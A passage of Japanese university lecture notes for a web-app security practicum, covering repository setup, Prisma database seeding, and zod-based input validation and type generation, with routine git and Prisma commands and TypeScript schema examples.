<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=yes"
    />
    <meta name="robots" content="noindex,nofollow,noarchive" />
    <meta name="referrer" content="no-referrer" />

    <script>
      MathJax = {
        chtml: {
          displayAlign: "left",
          displayIndent: "1em",
        },
      };
    </script>

    

    <link rel="icon" href="favicon.ico" sizes="any" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
      integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css?family=M+PLUS+Rounded+1c"
    />
    <link rel="stylesheet" href="style.css" />

    <title>4I-知能情報実験実習2</title>
  </head>

  <body>
    <div class="openbtn"><span></span><span></span><span></span></div>
    <nav id="g-nav">
      <div id="g-nav-list">
        <!-- ---------------------------------------- -->
         <ul>
<li><a href="#準備" id="toc-準備"><span class="toc-section-number">1</span> 準備</a>
<ul>
<li><a href="#演習-30分" id="toc-演習-30分"><span class="toc-section-number">1.1</span> 演習
<i class="fa-solid fa-stopwatch"></i>30分</a></li>
</ul></li>
<li><a href="#データベースについて" id="toc-データベースについて"><span
class="toc-section-number">2</span> データベースについて</a>
<ul>
<li><a href="#作業準備" id="toc-作業準備"><span class="toc-section-number">2.1</span>
作業準備</a></li>
<li><a href="#package.json-の変更-スクリプトの追加"
id="toc-package.json-の変更-スクリプトの追加"><span class="toc-section-number">2.2</span>
package.json の変更 (スクリプトの追加)</a></li>
<li><a href="#seed.ts-の作成" id="toc-seed.ts-の作成"><span class="toc-section-number">2.3</span>
seed.ts の作成</a></li>
<li><a href="#演習" id="toc-演習"><span class="toc-section-number">2.4</span> 演習</a></li>
<li><a href="#演習-1" id="toc-演習-1"><span class="toc-section-number">2.5</span> 演習</a></li>
</ul></li>
<li><a href="#zod-を利用したバリデーションと型定義について"
id="toc-zod-を利用したバリデーションと型定義について"><span class="toc-section-number">3</span> zod
を利用した「バリデーション」と「型定義」について</a>
<ul>
<li><a href="#バリデーションスキーマの定義と型の自動生成"
id="toc-バリデーションスキーマの定義と型の自動生成"><span class="toc-section-number">3.1</span>
バリデーションスキーマの定義と型の自動生成</a></li>
<li><a href="#データのバリデーション処理" id="toc-データのバリデーション処理"><span
class="toc-section-number">3.2</span> データのバリデーション処理</a></li>
<li><a href="#データのバリデーション処理-シンプルな例"
id="toc-データのバリデーション処理-シンプルな例"><span class="toc-section-number">3.3</span>
データのバリデーション処理 (シンプルな例)</a></li>
<li><a href="#演習-2" id="toc-演習-2"><span class="toc-section-number">3.4</span> 演習</a></li>
</ul></li>
<li><a href="#cookie-について" id="toc-cookie-について"><span class="toc-section-number">4</span>
Cookie について</a>
<ul>
<li><a href="#cookie-という仕組みが必要な理由" id="toc-cookie-という仕組みが必要な理由"><span
class="toc-section-number">4.1</span> Cookie という仕組みが必要な理由</a></li>
<li><a href="#cookie-の仕組み" id="toc-cookie-の仕組み"><span class="toc-section-number">4.2</span>
Cookie の仕組み</a></li>
<li><a href="#ウェブアプリ開発者が-cookie-について最低限知っておくべきこと"
id="toc-ウェブアプリ開発者が-cookie-について最低限知っておくべきこと"><span
class="toc-section-number">4.3</span> ウェブアプリ開発者が Cookie
について最低限知っておくべきこと</a></li>
<li><a href="#cookie-の属性設定" id="toc-cookie-の属性設定"><span
class="toc-section-number">4.4</span> Cookie の属性設定</a></li>
</ul></li>
<li><a href="#ニュースのコンテンツ" id="toc-ニュースのコンテンツ"><span
class="toc-section-number">5</span> 「ニュース」のコンテンツ</a>
<ul>
<li><a href="#クライアントサイド-フロントエンド-の処理"
id="toc-クライアントサイド-フロントエンド-の処理"><span class="toc-section-number">5.1</span>
クライアントサイド (フロントエンド) の処理</a></li>
<li><a href="#サーバサイド-バックエンド-の処理" id="toc-サーバサイド-バックエンド-の処理"><span
class="toc-section-number">5.2</span> サーバサイド (バックエンド) の処理</a></li>
<li><a href="#swr-について" id="toc-swr-について"><span class="toc-section-number">5.3</span> SWR
について</a></li>
</ul></li>
<li><a href="#ショップのコンテンツ" id="toc-ショップのコンテンツ"><span
class="toc-section-number">6</span> 「ショップ」のコンテンツ</a></li>
<li><a href="#xss脆弱性" id="toc-xss脆弱性"><span class="toc-section-number">7</span> XSS脆弱性</a>
<ul>
<li><a href="#実はニュースには反射型xssの潜在的リスクがある"
id="toc-実はニュースには反射型xssの潜在的リスクがある"><span class="toc-section-number">7.1</span>
実は「ニュース」には反射型XSSの潜在的リスクがある</a></li>
<li><a href="#クエリパラメータの処理" id="toc-クエリパラメータの処理"><span
class="toc-section-number">7.2</span> クエリパラメータの処理</a></li>
<li><a href="#エスケープ処理の方法" id="toc-エスケープ処理の方法"><span
class="toc-section-number">7.3</span> エスケープ処理の方法</a></li>
<li><a href="#サニタイズ-無害化-の方法" id="toc-サニタイズ-無害化-の方法"><span
class="toc-section-number">7.4</span> サニタイズ (無害化) の方法</a></li>
<li><a href="#flask-python-などでもxss脆弱性に注意"
id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section-number">7.5</span> Flask
(Python) などでもXSS脆弱性に注意</a></li>
</ul></li>
</ul> 
        <!-- ---------------------------------------- -->
      </div>
    </nav>

    <header class="markdown-body">
      <p>2025-4I 知能情報実験実習2 (前期) 講義資料</p>
      <p>毎週金曜日 1-4時限</p>
    </header>

    <main class="markdown-body">
      <!-- ---------------------------------------- -->
      <h1 data-number="1" id="準備"><span class="header-section-number">1</span> 準備</h1>
      <p>このテキストは、知能情報実験実習2 (前期) の「<strong>B班</strong>」の第5週目・07月18日 (金)
      の内容に関するものです。</p>
      <p><i class="fa-brands fa-github"></i><a
      href="https://github.com/TakeshiWada1980/web-sec-playground-1">こちら</a>
      のリポジトリのプロジェクト <code>web-sec-playground-1</code>
      を利用して、今週と来週で「<strong>ウェブアプリのセキュリティ</strong>」について体験的・実践的に学んでいきます。</p>
      <p>具体的には、次のような内容について学びます (次週に扱う内容も含んでいます) 。</p>
      <ul>
      <li>Cookie (クッキー)</li>
      <li>Prisma/DBの初期データ投入 (シーディング処理)</li>
      <li>zod (<a href="https://www.google.com/search?q=zodとは">バリデーションライブラリ</a>)</li>
      <li>XSS (クロスサイトスクリプティング) 攻撃</li>
      <li>SWR (<a href="https://swr.vercel.app/ja">データ取得のための React Hooks
      ライブラリ</a>)</li>
      <li>パスワードのハッシュ化</li>
      <li>セッションベース認証</li>
      <li>トークンベース認証 (JWT)</li>
      <li>Content Security Policy (CSP)</li>
      <li>Next.js ServerActions (Custom Invocation)</li>
      </ul>
      <p>昨年度の<a
      href="https://takeshiwada1980.github.io/Programming3-2024/">プログラミング3</a>では<a
      href="https://supabase.com/">Supabase</a>が提供する「<strong>ユーザ認証機能</strong>」を利用してウェブアプリを開発しましたが、ここではセキュティに対する理解を深めるために
      <span class="masked">ゼロからユーザ認証機を実装</span> していきます。</p>
      <h2 data-number="1.1" id="演習-30分"><span class="header-section-number">1.1</span> 演習
      <i class="fa-solid fa-stopwatch"></i>30分</h2>
      <p><a
      href="https://github.com/TakeshiWada1980/web-sec-playground-1">リポジトリ</a>をクローンして
      <code>README.md</code> に示す手順でプロジェクトをセットアップしてください。</p>
      <ul>
      <li>クローンは<a
      href="https://takeshiwada1980.github.io/Programming1-2024/lecture27.html#リポジトリのクローン">PG1で学習済み</a>です。手順は
      README.md にも記載されています。</li>
      </ul>
      <p>そして、実際にアプリの起動と操作、プログラムの読解を通じて<strong>ウェブアプリの「全体概要」を把握</strong>
      (＝フォルダ構成やプログラム内容をざっくりと把握)
      してください。この際、AIも活用してください。機能等の詳細な解説については、このあとで行ないますが、<strong>まずは自分自身で理解に努め、疑問点や不明点を整理して明確化しておくこと</strong>
      が効果的な学びにつながります。実際の開発においても「<strong>自分でコードを書くこと</strong>」よりも
      <span class="masked">「他人が書いたコードやAIが提案したコードを読解・評価すること」</span>
      のほうが圧倒的に多いです。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>実際のソフトウェア開発では「自分でコードを書くこと
      (＝コーディング)」よりも、「他人が書いたコードあるいはAIが提案したコードを読解・評価すること
      (＝コードリーディング)」のほうが圧倒的に多い、と聞きました。本当ですか？</p>
      </blockquote>
      <p>基本的には、昨年度の<a
      href="https://takeshiwada1980.github.io/Programming3-2024/">プログラミング3</a>で学んだことが定着していれば、概ね理解できる内容となっています。</p>
      <p>以下の順序でプログラムや機能を理解・把握していくことを推奨します。ただし、あくまで目安であり、実際には
      <span class="masked">各ファイルを何度も往復しながら全体像を掴んでいく必要</span>
      があります。また、<strong>以下に示されている以外のファイルも必要に応じて参照</strong>
      していく必要があります。</p>
      <ol type="1">
      <li><strong>データベース</strong>
      <ul>
      <li><code>prisma/schema.prisma</code></li>
      <li><code>prisma/seed.ts</code></li>
      </ul></li>
      <li><strong>ニュース</strong> <code>http://localhost:3000/news</code>
      <ul>
      <li><code>src/app/news/page.tsx</code></li>
      <li><code>src/app/api/news/route.ts</code></li>
      <li><code>src/app/_types/ApiResponse.ts</code></li>
      </ul></li>
      <li><strong>ショップ</strong> <code>http://localhost:3000/shop</code>
      <ul>
      <li><code>src/app/shop/page.tsx</code></li>
      <li><code>src/app/_types/Product.ts</code></li>
      <li><code>src/app/api/products/route.ts</code></li>
      <li><code>src/app/_types/CartItrem.ts</code></li>
      <li><code>src/app/api/cart/route.ts</code></li>
      </ul></li>
      <li><strong>ログイン</strong> <code>http://localhost:3000/login</code>
      <ul>
      <li>主に次週に扱う内容なので余裕があれば…</li>
      </ul></li>
      <li><strong>サインアップ</strong> <code>http://localhost:3000/signup</code>
      <ul>
      <li>主に次週に扱う内容なので余裕があれば…</li>
      </ul></li>
      </ol>
      <p>なお、機能や設定を確認・把握するためにプログラムや設定を書き換える場合は、<strong>新たにブランチを切って、そのブランチでファイルを編集するようにしてください</strong>。以降の説明
      (特に行番号) との不整合が生じるので、<code>main</code>
      ブランチには手を加えないでください。</p>
      <p><strong>▼ ブランチの新規作成と切り替え ▼</strong></p>
      <pre><code>git checkout -b sandbox
git commit --allow-empty -m &quot;Start sandbox branch&quot;</code></pre>
      <p>なお、ブランチは<a
      href="https://s-ao213.github.io/GitHub_Using_Lesson/#branch">GitHub入門</a>(S.Aさんが作成👍)
      で非常に分かりやすく＆丁寧に解説されています。</p>
      <p>また <code>npx prisma studio</code> で「<strong>Prisma Studio</strong>」を起動し、DB
      の内容についても簡単に把握しておいてください。</p>
      <div class="note type-tips">
      <p><strong>ブランチの切り替え</strong></p>
      <p>演習が終わったあとは、以下の手順で <code>main</code> ブランチに戻っておいてください。</p>
      <pre><code>git commit -m &quot;Finish sandbox branch&quot; 
git checkout main  # mainブランチに戻る
git branch -D sandbox  # sandboxブランチの削除（必要に応じて）
npx prisma db seed</code></pre>
      <p><code>main</code> がチェックアウトされていること (アクティブなブランチになっていること)
      を確認してください。</p>
      <figure>
      <img src="figs/01/vscode-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>なお、ファイルを保存・コミットせずに <code>main</code>
      ブランチに切り替えると、作業中の変更がそのまま
      <code>main</code>ブランチに持ち越されることがあるので注意してください。</p>
      <p>また、DBの内容についても、以下のコマンで初期状態に戻しておいてください。</p>
      <pre><code>npx prisma db seed</code></pre>
      </div>
      <h1 data-number="2" id="データベースについて"><span class="header-section-number">2</span>
      データベースについて</h1>
      <p>このプロジェクトでは <code>npx prisma db seed</code>
      というコマンドを使って、<strong>データベースのレコードをクリアした上で、定義済みの初期データを投入</strong>
      できるようにしています。このような処理は、一般に「<strong>シーディング
      (Seeding)</strong>」や「シード処理」「初期データ投入」と呼ばれます。</p>
      <p>なお、<code>npx prisma db seed</code> は、<code>npx prisma db push</code> や
      <code>npx prisma generate</code> のように Prisma が標準で提供しているコマンド
      (ビルトインコマンド) ではなく、以下のように <span
      class="masked">開発者が自分でスクリプトを用意し、設定することで使用可能になるカスタムコマンド</span>
      となっています。</p>
      <p>具体的には <code>package.json</code> を変更して、<code>prisma/seed.ts</code>
      を作成する必要があります。</p>
      <h2 data-number="2.1" id="作業準備"><span class="header-section-number">2.1</span>
      作業準備</h2>
      <p>ここからは <code>week-5</code>
      というブランチを新規作成して、そこで作業を行なってください。</p>
      <pre><code>git checkout main # mainブランチであることを確認
git checkout -b week-5 # week-5ブランチを作成・切替
git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
      <h2 data-number="2.2" id="package.json-の変更-スクリプトの追加"><span
      class="header-section-number">2.2</span> package.json の変更 (スクリプトの追加)</h2>
      <p>プロジェクトフォルダのルートにある <code>package.json</code>
      に、次のような設定を追加します。クローンしてきたプロジェクトでは既に設定を追加済みなので、確認だけしてください。</p>
      <p><code>package.json</code> の役割や、次のスクリプトのなかで使用している <code>ts-node</code>
      については、プログラミング3の授業のなかで<a
      href="https://takeshiwada1980.github.io/Programming3-2024/lecture01.html#開発を効率的に行なうためのパッケージの追加">既に解説済み</a>です。</p>
      <div class="sourceCode" id="cb5"
      data-caption="package.json シーディング処理のためのスクリプトの追加" data-startFrom="11"><pre
      class="sourceCode numberSource json numberLines"><code class="sourceCode json" style="counter-reset: source-line 10;"><span id="cb5-11"><a href="#cb5-11"></a><span class="er">&quot;prisma&quot;:</span> <span class="fu">{</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>  <span class="dt">&quot;seed&quot;</span><span class="fu">:</span> <span class="st">&quot;ts-node --compiler-options {</span><span class="ch">\&quot;</span><span class="st">module</span><span class="ch">\&quot;</span><span class="st">:</span><span class="ch">\&quot;</span><span class="st">CommonJS</span><span class="ch">\&quot;</span><span class="st">} prisma/seed.ts&quot;</span></span>
<span id="cb5-13"><a href="#cb5-13"></a><span class="fu">}</span><span class="er">,</span></span></code></pre></div>
      <p>上記のスクリプトを加えることで、VSCode のターミナル (<code>Ctrl+J</code>で起動) から
      <code>npx prisma db seed</code> というコマンドを実行したときに <code>prisma/seed.ts</code>
      が<strong>単体で実行</strong>されるようになります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js 15 / TypeScript / Prisma でウェブアプリ開発をしています。いま
      <code>package.json</code>
      に以下の内容を追加するように指示されました。このようなスクリプトを設定する目的と、実行したときの動作について解説してください。</p>
      <pre><code>&quot;prisma&quot;: {
 &quot;seed&quot;: &quot;ts-node --compiler-options {\&quot;module\&quot;:\&quot;CommonJS\&quot;} prisma/seed.ts&quot;
},</code></pre>
      </blockquote>
      <h2 data-number="2.3" id="seed.ts-の作成"><span class="header-section-number">2.3</span>
      seed.ts の作成</h2>
      <p>データベースの「<strong>レコードのクリア処理</strong>」と「<strong>初期データの挿入処理</strong>」を
      <code>prisma/seed.ts</code> というファイルを新規作成して記述します。</p>
      <p>このとき、<code>seed.ts</code> を配置する場所には注意してください。このファイルを
      <code>src</code> フォルダ内に置いてしまうと<code>npm run dev</code> や
      <code>npm run build</code> を実行したときに、<strong><code>seed.ts</code>
      もビルド対象として処理されてしまう可能性</strong>
      があります。プロダクトのなかに「データベースの初期化処理」が含まれることは、<strong>セキュリティ上の重大なリスク</strong>
      となるので十分に注意してください。</p>
      <div class="note type-caution">
      <p><strong>要注意 seed.ts のインポート設定について</strong></p>
      <p><code>seed.ts</code> のなかで使用する <strong>自作のモジュール (型定義など)</strong>
      は、必ず <span class="masked">相対パス</span>
      で指定してインポートしてください。インポートにパスエイリアス（例：<code>@/app/_types/UserSeed</code>
      のような記述）を使用すると、<code>npx prisma db seed</code>
      コマンドの実行時にエラーが発生します。</p>
      </div>
      <h2 data-number="2.4" id="演習"><span class="header-section-number">2.4</span> 演習</h2>
      <p><code>prisma/seed.ts</code>
      のインポート設定を次のように書き換えると、<code>npx prisma db seed</code>
      に「<strong>失敗すること</strong>」を確認してください。確認後は、元に戻しておいてください。</p>
      <div class="sourceCode" id="cb7"
      data-caption="prisma/seed.ts (抜粋) パスエイリアスを使用すると実行失敗"
      data-startFrom="5"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 4;"><span id="cb7-5"><a href="#cb7-5"></a><span class="im">import</span> { UserSeed<span class="op">,</span> userSeedSchema } <span class="im">from</span> <span class="st">&quot;@/app/_types/UserSeed&quot;</span><span class="op">;</span> <span class="co">// パスエイリアを使用</span></span></code></pre></div>
      <p>なお、上記でインポートされる <code>UserSeed.ts</code>
      のなかのインポート設定についても「<strong>相対パス</strong>」で指定する必要があります。実際に、<code>UserSeed.ts</code>
      の <strong>第07行目</strong> を以下のように書き換えると <code>npx prisma db seed</code>
      に失敗することを確認してください。</p>
      <div class="sourceCode" id="cb8"
      data-caption="src/app/_types/UserSeed.ts (抜粋) パスエイリアスを使用すると実行失敗"
      data-startFrom="9"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 8;"><span id="cb8-9"><a href="#cb8-9"></a>} <span class="im">from</span> <span class="st">&quot;@/app/_types/CommonSchemas&quot;</span><span class="op">;</span> <span class="co">// パスエイリアを使用</span></span></code></pre></div>
      <p>確認後は、元に戻しておいてください。</p>
      <h2 data-number="2.5" id="演習-1"><span class="header-section-number">2.5</span> 演習</h2>
      <p><code>prisma/seed.ts</code>
      を編集して、<code>newsItem</code>、<code>products</code>、<code>user</code>
      について「初期データ」をいくつか追加してみてください。</p>
      <p><code>prisma/seed.ts</code> の編集後は
      <code>npx prisma db seed</code>、<code>npx prisma studio</code> を実行して
      <strong>編集を加えた初期データが DB に反映されていること</strong> を確認してください。</p>
      <h1 data-number="3" id="zod-を利用したバリデーションと型定義について"><span
      class="header-section-number">3</span> zod
      を利用した「バリデーション」と「型定義」について</h1>
      <p>シーディング処理に使用する <code>seed.ts</code> や、それに関連する型定義ファイル
      (<code>UserSeed.ts</code> など) では、<strong>zod</strong> (ゾッド) という
      <strong>バリデーションライブラリ</strong> を積極的に使って <span
      class="masked">入力データの整合性を厳密に検証する設計</span> で実装されています。</p>
      <ul>
      <li><a href="https://www.google.com/search?q=zodとは">zodとは</a> @ Google 検索</li>
      </ul>
      <p><a
      href="https://www.google.com/search?q=zodとは">zod</a>は、TypeScriptにおいて「<strong>バリデーション（入力値検証）の定義</strong>」と「<strong>型定義</strong>」を同時に記述することができるライブラリとなっています。TypeScriptでは、変数やオブジェクトに対して「数値型（number型）」や「文字列型（string型）」などの基本的な「型づけ」は可能となっていますが、<span
      class="masked">「0以上100以下の整数値」や「5文字以上20文字以下の文字列」</span>
      のような細かな制約条件については <strong>開発者が独自にバリデーションロジック
      (入力値の検証ロジック) を実装する必要</strong> があります。</p>
      <div class="note type-caution">
      <p><strong>ウェブアプリにおけるバリデーション処理 (入力値検証処理) の重要性</strong></p>
      <p>ウェブアプリ開発においては、特に「テキストボックスなどを使ったユーザからの入力データ」と「HTTPリクエスト/レスポンスのボディデータ」に関して、セキュリティ上の観点から
      <strong>「悪意ある値」や「不正な値」である可能性も十分に予見して安全に取り扱うこと</strong>
      が求められます。</p>
      <p>このような場面において、バリデーション (入力値検証) の処理が重要となってきます。</p>
      </div>
      <p>バリデーション処理は、自分でロジックを書くこともできますが、zod
      を利用すれば複雑な処理も極めて簡潔に記述することができます。さらに zod
      では、<strong>スキーマ</strong> (＝ <span
      class="masked">入力データが満たすべき制約条件や構造を定義したもの</span>)
      から自動的に「<strong>TypeScriptの型定義</strong>」を生成する機能も利用可能となっています。</p>
      <div class="sourceCode" id="cb9"
      data-caption="スキーマから「型」を生成する例 (src/app/_types/CartItem.ts)"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb9-1"><a href="#cb9-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span> <span class="co">// zodライブラリのインポート</span></span>
<span id="cb9-2"><a href="#cb9-2"></a></span>
<span id="cb9-3"><a href="#cb9-3"></a><span class="co">// バリデーションスキーマ（データが満たすべき制約条件や構造を定義）</span></span>
<span id="cb9-4"><a href="#cb9-4"></a><span class="im">export</span> <span class="kw">const</span> cartItemSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">object</span>({</span>
<span id="cb9-5"><a href="#cb9-5"></a>  productId<span class="op">:</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">1</span>)<span class="op">.</span><span class="fu">max</span>(<span class="dv">10</span>)<span class="op">,</span> <span class="co">// 1文字以上10文字以下の「文字列」</span></span>
<span id="cb9-6"><a href="#cb9-6"></a>  quantity<span class="op">:</span> z<span class="op">.</span><span class="fu">number</span>()<span class="op">.</span><span class="fu">int</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">0</span>)<span class="op">,</span> <span class="co">// 0以上の「整数値」</span></span>
<span id="cb9-7"><a href="#cb9-7"></a>})<span class="op">;</span></span>
<span id="cb9-8"><a href="#cb9-8"></a></span>
<span id="cb9-9"><a href="#cb9-9"></a><span class="co">// バリデーションスキーマをもとに「CartItem型」を生成</span></span>
<span id="cb9-10"><a href="#cb9-10"></a><span class="im">export type</span> CartItem <span class="op">=</span> z<span class="op">.</span><span class="at">infer</span><span class="op">&lt;</span><span class="kw">typeof</span> cartItemSchema<span class="op">&gt;;</span></span></code></pre></div>
      <p>また、zod はクライアントサイド (フロントエンド) において、<strong>フォーム入力</strong> (＝
      <code>react-hook-form</code> の <code>useForm</code>) とも
      <strong>連携して強力なバリデーション機能を提供してくれます</strong>。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js (TypeScript)
      でウェブアプリを開発しています。「react-hook-form」の「useForm」とは何ですか？これを使わずにフォーム入力を実装するのと、使って実装するのでは、どのような違いがありますか？具体的なシナリオを例に分かりやすく説明してください。</p>
      </blockquote>
      <p>以下は、<code>react-hook-form</code> と <code>zod</code> を組み合わせて作成した入力フォーム
      (<code>src/app/login.tsx</code> )
      の例です。このプロジェクトにおいては、<strong>ログイン機能</strong> (<code>/login</code>) や
      <strong>サインイン機能</strong> (<code>/signup</code>) のなかで利用しています。</p>
      <figure>
      <img src="figs/01/zod-01.png" alt="zod" />
      <figcaption aria-hidden="true">zod</figcaption>
      </figure>
      <p>zod
      を積極活用することで「<strong>煩雑</strong>」かつ「<strong>コードの可読性を低下させる原因</strong>」となるバリデーション処理を
      <span class="masked">簡潔かつ確実に実装すること</span> が可能になります。Next.js / React /
      TypeScript の実際の開発現場においてもバリデーションライブラリとして zod
      は、かなり使用されています。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>TypeScript による Next.js / React
      のウェブアプリの開発現場で、バリデーションライブラリとして「zodがよく使われている」って聞いたんだけどホント？</p>
      </blockquote>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js / TypeScript
      でウェブアプリ開発をしています。データのバリデーションを実施すべきなのは、どのようなタイミングや場面ですか。クライアントサイド
      (フロントエンド)、サーバサイド (バックエンド) のそれぞれについて教えてください。</p>
      </blockquote>
      <h2 data-number="3.1" id="バリデーションスキーマの定義と型の自動生成"><span
      class="header-section-number">3.1</span> バリデーションスキーマの定義と型の自動生成</h2>
      <p>このプロジェクトでは、<code>prisma/seed.ts</code> のシーディング処理についても、zod
      による型生成やバリデーションを活用しています。</p>
      <p>まず、<code>src/app/_types/CommonSchemas.ts</code> のなかで <code>UserSeed.ts</code>
      や、認証機能などに使用する型定義ファイル (<code>LoginRequest.ts</code> や
      <code>UserProfile.ts</code> など) で共通利用する <strong>バリデーションスキーマ</strong>
      (＝<span class="masked">入力データが満たすべき制約条件や構造を定義したもの</span>)
      を以下のように記述しています。</p>
      <div class="sourceCode" id="cb10"
      data-caption="src/app/_types/CommonSchemas.ts 共通バリデーションスキーマの定義"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb10-1"><a href="#cb10-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span></span>
<span id="cb10-2"><a href="#cb10-2"></a><span class="im">import</span> { Role } <span class="im">from</span> <span class="st">&quot;./Role&quot;</span><span class="op">;</span></span>
<span id="cb10-3"><a href="#cb10-3"></a></span>
<span id="cb10-4"><a href="#cb10-4"></a><span class="im">export</span> <span class="kw">const</span> passwordSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">5</span>)<span class="op">;</span></span>
<span id="cb10-5"><a href="#cb10-5"></a><span class="im">export</span> <span class="kw">const</span> emailSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">email</span>()<span class="op">;</span></span>
<span id="cb10-6"><a href="#cb10-6"></a><span class="im">export</span> <span class="kw">const</span> userNameSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb10-7"><a href="#cb10-7"></a><span class="im">export</span> <span class="kw">const</span> roleSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">nativeEnum</span>(Role)<span class="op">;</span></span>
<span id="cb10-8"><a href="#cb10-8"></a></span>
<span id="cb10-9"><a href="#cb10-9"></a><span class="co">// prettier-ignore</span></span>
<span id="cb10-10"><a href="#cb10-10"></a><span class="im">export</span> <span class="kw">const</span> isUUID <span class="op">=</span> (value<span class="op">:</span> <span class="dt">string</span>) <span class="kw">=&gt;</span> <span class="ss">/</span><span class="sc">^[0-9a-f]{8}</span><span class="ss">-</span><span class="sc">[0-9a-f]{4}</span><span class="ss">-4</span><span class="sc">[0-9a-f]{3}</span><span class="ss">-</span><span class="sc">[89ab][0-9a-f]{3}</span><span class="ss">-</span><span class="sc">[0-9a-f]{12}$</span><span class="ss">/i</span><span class="op">.</span><span class="fu">test</span>(value)<span class="op">;</span></span>
<span id="cb10-11"><a href="#cb10-11"></a></span>
<span id="cb10-12"><a href="#cb10-12"></a><span class="im">export</span> <span class="kw">const</span> uuidSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">refine</span>(isUUID<span class="op">,</span> {</span>
<span id="cb10-13"><a href="#cb10-13"></a>  message<span class="op">:</span> <span class="st">&quot;Invalid UUID format.&quot;</span><span class="op">,</span></span>
<span id="cb10-14"><a href="#cb10-14"></a>})<span class="op">;</span></span>
<span id="cb10-15"><a href="#cb10-15"></a></span>
<span id="cb10-16"><a href="#cb10-16"></a><span class="co">// 以下略</span></span></code></pre></div>
      <p><code>CommonSchemas.ts</code> の <strong>第10行目</strong> から <strong>第14行目</strong>
      では、「正規表現」を使用してUUIDの形式 ( 16進数による
      <code>00000000-0000-0000-0000-000000000000</code> 形式)
      をチェックするカスタムバリデーションスキーマを定義しています。なお、正規表現はプログラミング1で<a
      href="https://takeshiwada1980.github.io/Programming1-2024/lecture27.html#正規表現">既に学習済み</a>です。</p>
      <p>次に、<code>UserSeed.ts</code> において、それらのバリデーションスキーマを利用して
      <code>userSeedSchema</code> を定義し、<strong>第16行目</strong> では
      <code>z.infer&lt;typeof userSeedSchema&gt;</code>
      により「<strong>UserSeed型</strong>」を自動生成しています。</p>
      <div class="sourceCode" id="cb11" data-caption="src/app/_types/UserSeed.ts"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb11-1"><a href="#cb11-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span></span>
<span id="cb11-2"><a href="#cb11-2"></a><span class="im">import</span> {</span>
<span id="cb11-3"><a href="#cb11-3"></a>  userNameSchema<span class="op">,</span></span>
<span id="cb11-4"><a href="#cb11-4"></a>  emailSchema<span class="op">,</span></span>
<span id="cb11-5"><a href="#cb11-5"></a>  passwordSchema<span class="op">,</span></span>
<span id="cb11-6"><a href="#cb11-6"></a>  roleSchema<span class="op">,</span></span>
<span id="cb11-7"><a href="#cb11-7"></a>  aboutSlugSchema<span class="op">,</span></span>
<span id="cb11-8"><a href="#cb11-8"></a>  aboutContentSchema<span class="op">,</span></span>
<span id="cb11-9"><a href="#cb11-9"></a>} <span class="im">from</span> <span class="st">&quot;./CommonSchemas&quot;</span><span class="op">;</span></span>
<span id="cb11-10"><a href="#cb11-10"></a></span>
<span id="cb11-11"><a href="#cb11-11"></a><span class="im">export</span> <span class="kw">const</span> userSeedSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">object</span>({</span>
<span id="cb11-12"><a href="#cb11-12"></a>  name<span class="op">:</span> userNameSchema<span class="op">,</span></span>
<span id="cb11-13"><a href="#cb11-13"></a>  email<span class="op">:</span> emailSchema<span class="op">,</span></span>
<span id="cb11-14"><a href="#cb11-14"></a>  password<span class="op">:</span> passwordSchema<span class="op">,</span></span>
<span id="cb11-15"><a href="#cb11-15"></a>  role<span class="op">:</span> roleSchema<span class="op">,</span></span>
<span id="cb11-16"><a href="#cb11-16"></a>  aboutSlug<span class="op">:</span> aboutSlugSchema<span class="op">.</span><span class="fu">optional</span>()<span class="op">,</span></span>
<span id="cb11-17"><a href="#cb11-17"></a>  aboutContent<span class="op">:</span> aboutContentSchema<span class="op">.</span><span class="fu">optional</span>()<span class="op">,</span></span>
<span id="cb11-18"><a href="#cb11-18"></a>})<span class="op">;</span></span>
<span id="cb11-19"><a href="#cb11-19"></a></span>
<span id="cb11-20"><a href="#cb11-20"></a><span class="im">export type</span> UserSeed <span class="op">=</span> z<span class="op">.</span><span class="at">infer</span><span class="op">&lt;</span><span class="kw">typeof</span> userSeedSchema<span class="op">&gt;;</span></span></code></pre></div>
